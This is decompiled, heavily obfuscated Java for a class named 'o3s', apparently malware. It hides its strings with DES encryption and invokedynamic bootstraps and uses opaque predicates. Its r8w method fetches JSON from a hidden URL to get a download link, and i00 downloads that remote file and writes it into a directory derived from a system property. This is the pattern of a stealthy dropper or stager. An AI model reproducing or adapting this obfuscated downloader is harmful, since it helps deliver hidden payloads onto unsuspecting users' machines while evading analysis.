import com.google.gson.Gson;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.invoke.CallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MutableCallSite;
import java.lang.invoke.MethodHandles.Lookup;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class o3s {
   public static String c4s;
   private static final long a;
   private static final String[] b;
   private static final String[] c;
   private static final Map d = new HashMap(13);

   public static File i00() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 000: getstatic o3s.a J
      // 003: ldc2_w 15073880111290
      // 006: lxor
      // 007: lstore 0
      // 008: invokestatic o3s.r8w ()Ljava/net/URL;
      // 00b: astore 3
      // 00c: invokestatic OpaquePredicate.b ()I
      // 00f: new java/lang/StringBuilder
      // 012: dup
      // 013: invokespecial java/lang/StringBuilder.<init> ()V
      // 016: sipush 31642
      // 019: ldc2_w 7344610535448003717
      // 01c: lload 0
      // 01d: lxor
      // 01e: invokedynamic p (IJ)Ljava/lang/String; bsm=o3s.a (Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite; args=[  ]
      // 023: nop
      // 024: invokestatic java/lang/System.getProperty (Ljava/lang/String;)Ljava/lang/String;
      // 027: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 02a: sipush 29115
      // 02d: ldc2_w 6840633242177425061
      // 030: lload 0
      // 031: lxor
      // 032: invokedynamic p (IJ)Ljava/lang/String; bsm=o3s.a (Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite; args=[  ]
      // 037: nop
      // 038: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 03b: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
      // 03e: astore 4
      // 040: istore 2
      // 041: new java/io/File
      // 044: dup
      // 045: aload 4
      // 047: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 04a: astore 5
      // 04c: new java/io/File
      // 04f: dup
      // 050: new java/lang/StringBuilder
      // 053: dup
      // 054: invokespecial java/lang/StringBuilder.<init> ()V
      // 057: aload 4
      // 059: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 05c: getstatic o3s.c4s Ljava/lang/String;
      // 05f: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 062: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
      // 065: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 068: astore 6
      // 06a: aload 5
      // 06c: invokevirtual java/io/File.exists ()Z
      // 06f: iload 2
      // 070: ifeq 0b4
      // 073: ifne 0a4
      // 076: goto 07d
      // 079: invokestatic o3s.a (Ljava/io/FileNotFoundException;)Ljava/io/FileNotFoundException;
      // 07c: athrow
      // 07d: aload 5
      // 07f: invokevirtual java/io/File.isDirectory ()Z
      // 082: iload 2
      // 083: ifeq 0b4
      // 086: goto 08d
      // 089: invokestatic o3s.a (Ljava/io/FileNotFoundException;)Ljava/io/FileNotFoundException;
      // 08c: athrow
      // 08d: ifne 0a4
      // 090: goto 097
      // 093: invokestatic o3s.a (Ljava/io/FileNotFoundException;)Ljava/io/FileNotFoundException;
      // 096: athrow
      // 097: aload 5
      // 099: invokevirtual java/io/File.mkdirs ()Z
      // 09c: pop
      // 09d: goto 0a4
      // 0a0: invokestatic o3s.a (Ljava/io/FileNotFoundException;)Ljava/io/FileNotFoundException;
      // 0a3: athrow
      // 0a4: aload 6
      // 0a6: iload 2
      // 0a7: ifeq 0b9
      // 0aa: invokevirtual java/io/File.exists ()Z
      // 0ad: goto 0b4
      // 0b0: invokestatic o3s.a (Ljava/io/FileNotFoundException;)Ljava/io/FileNotFoundException;
      // 0b3: athrow
      // 0b4: ifeq 0ba
      // 0b7: aload 6
      // 0b9: areturn
      // 0ba: aload 3
      // 0bb: invokevirtual java/net/URL.openConnection ()Ljava/net/URLConnection;
      // 0be: astore 7
      // 0c0: aload 7
      // 0c2: invokevirtual java/net/URLConnection.getInputStream ()Ljava/io/InputStream;
      // 0c5: astore 8
      // 0c7: new java/io/FileOutputStream
      // 0ca: dup
      // 0cb: aload 6
      // 0cd: invokespecial java/io/FileOutputStream.<init> (Ljava/io/File;)V
      // 0d0: astore 9
      // 0d2: bipush 0
      // 0d3: istore 10
      // 0d5: aload 8
      // 0d7: invokevirtual java/io/InputStream.read ()I
      // 0da: dup
      // 0db: istore 10
      // 0dd: bipush -1
      // 0de: if_icmpeq 0f7
      // 0e1: aload 9
      // 0e3: iload 10
      // 0e5: invokevirtual java/io/OutputStream.write (I)V
      // 0e8: iload 2
      // 0e9: ifeq 101
      // 0ec: iload 2
      // 0ed: ifne 0d5
      // 0f0: goto 0f7
      // 0f3: invokestatic o3s.a (Ljava/io/FileNotFoundException;)Ljava/io/FileNotFoundException;
      // 0f6: athrow
      // 0f7: aload 8
      // 0f9: invokevirtual java/io/InputStream.close ()V
      // 0fc: aload 9
      // 0fe: invokevirtual java/io/OutputStream.close ()V
      // 101: aload 6
      // 103: areturn
      // 104: astore 5
      // 106: aload 5
      // 108: invokevirtual java/io/FileNotFoundException.printStackTrace ()V
      // 10b: goto 115
      // 10e: astore 5
      // 110: aload 5
      // 112: invokevirtual java/io/IOException.printStackTrace ()V
      // 115: aconst_null
      // 116: areturn
   }

   public static URL r8w() {
      long var0 = a ^ 138666548339928L;

      try {
         String var2 = crb.qq0(new URL(a<"p">(7469, 4694904319830916690L ^ var0)));
         Gson var3 = new Gson();
         o3s$da6 var4 = (o3s$da6)var3.fromJson(var2, o3s$da6.class);
         String var5 = var4.jkl();
         c4s = var5.substring(var5.lastIndexOf("/") + 1);
         return new URL(var5);
      } catch (IOException var6) {
         var6.printStackTrace();
         return null;
      }
   }

   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static {
      synchronized (c.g()){} // $VF: monitorenter 
      long var10000 = c.a(-671826871888353584L, -2389981189508150419L, MethodHandles.lookup().lookupClass()).a(239153618365997L);
      // $VF: monitorexit
      a = var10000;
      long var0 = a ^ 66179593881517L;
      Cipher var2;
      Cipher var12 = var2 = Cipher.getInstance("DES/CBC/PKCS5Padding");
      SecretKeyFactory var10002 = SecretKeyFactory.getInstance("DES");
      byte[] var10003 = new byte[]{(byte)((int)(var0 >>> 56)), 0, 0, 0, 0, 0, 0, 0};

      for (int var3 = 1; var3 < 8; var3++) {
         var10003[var3] = (byte)((int)(var0 << var3 * 8 >>> 56));
      }

      var12.init(2, var10002.generateSecret(new DESKeySpec(var10003)), new IvParameterSpec(new byte[8]));
      String[] var9 = new String[3];
      int var7 = 0;
      String var6 = "\u008eÂÄÓÌ\u0097Lnðà@w½\u001c@\u0092\u001d9ÕËê\u0013Ûw\u0018E8ÛAÄ\u0084\\\u0095>^Ê\b\u0089\u000f2D$\u0089}¯Pd»°X\u0010 nB]¾&`$\u001bÚ\b¿´¤÷{+G8ÉA}í\u008b\u0093&.KU«dêNå0$A\u0002¿\u00ad\u0088 »\u0017ìgêLîzé7\n\u0012óÂÁ§rõ\u009d?\u008cPo±\u008f\u0080ðPú`Ù[wâ\tìÚ{M\u00adû¬Ñ\u001bx";
      int var8 = "\u008eÂÄÓÌ\u0097Lnðà@w½\u001c@\u0092\u001d9ÕËê\u0013Ûw\u0018E8ÛAÄ\u0084\\\u0095>^Ê\b\u0089\u000f2D$\u0089}¯Pd»°X\u0010 nB]¾&`$\u001bÚ\b¿´¤÷{+G8ÉA}í\u008b\u0093&.KU«dêNå0$A\u0002¿\u00ad\u0088 »\u0017ìgêLîzé7\n\u0012óÂÁ§rõ\u009d?\u008cPo±\u008f\u0080ðPú`Ù[wâ\tìÚ{M\u00adû¬Ñ\u001bx"
         .length();
      char var5 = 24;
      int var4 = -1;

      while (true) {
         byte[] var10 = var2.doFinal(var6.substring(++var4, var4 + var5).getBytes("ISO-8859-1"));
         String var14 = a(var10).intern();
         byte var10001 = -1;
         var9[var7++] = var14;
         if ((var4 += var5) >= var8) {
            b = var9;
            c = new String[3];
            c4s = null;
            return;
         }

         var5 = var6.charAt(var4);
      }
   }

   private static FileNotFoundException a(FileNotFoundException var0) {
      return var0;
   }

   private static String a(byte[] var0) {
      int var1 = 0;
      int var2;
      char[] var3 = new char[var2 = var0.length];

      for (int var4 = 0; var4 < var2; var4++) {
         int var5;
         if ((var5 = 255 & var0[var4]) < 192) {
            var3[var1++] = (char)var5;
         } else if (var5 < 224) {
            char var6 = (char)((char)(var5 & 31) << 6);
            byte var8 = var0[++var4];
            var6 = (char)(var6 | (char)(var8 & 63));
            var3[var1++] = var6;
         } else if (var4 < var2 - 2) {
            char var12 = (char)((char)(var5 & 15) << '\f');
            byte var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63) << 6);
            var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63));
            var3[var1++] = var12;
         }
      }

      return new String(var3, 0, var1);
   }

   private static String a(int var0, long var1) {
      int var5 = var0 ^ (int)(var1 & 32767L) ^ 25594;
      if (c[var5] == null) {
         Object[] var4;
         try {
            Long var3 = Thread.currentThread().getId();
            var4 = (Object[])d.get(var3);
            if (var4 == null) {
               var4 = new Object[]{Cipher.getInstance("DES/CBC/PKCS5Padding"), SecretKeyFactory.getInstance("DES"), new IvParameterSpec(new byte[8])};
               d.put(var3, var4);
            }
         } catch (Exception var10) {
            throw new RuntimeException("o3s", var10);
         }

         byte[] var6 = new byte[8];
         var6[0] = (byte)((int)(var1 >>> 56));

         for (int var7 = 1; var7 < 8; var7++) {
            var6[var7] = (byte)((int)(var1 << var7 * 8 >>> 56));
         }

         DESKeySpec var11 = new DESKeySpec(var6);
         SecretKey var8 = ((SecretKeyFactory)var4[1]).generateSecret(var11);
         ((Cipher)var4[0]).init(2, var8, (IvParameterSpec)var4[2]);
         byte[] var9 = b[var5].getBytes("ISO-8859-1");
         c[var5] = a(((Cipher)var4[0]).doFinal(var9));
      }

      return c[var5];
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, Object[] var3) {
      int var4 = (Integer)var3[0];
      long var5 = (Long)var3[1];
      String var7 = a(var4, var5);
      MethodHandle var8 = MethodHandles.constant(String.class, var7);
      var1.setTarget(MethodHandles.dropArguments(var8, 0, int.class, long.class));
      return var7;
   }

   private static CallSite a(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("o3s" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }
}
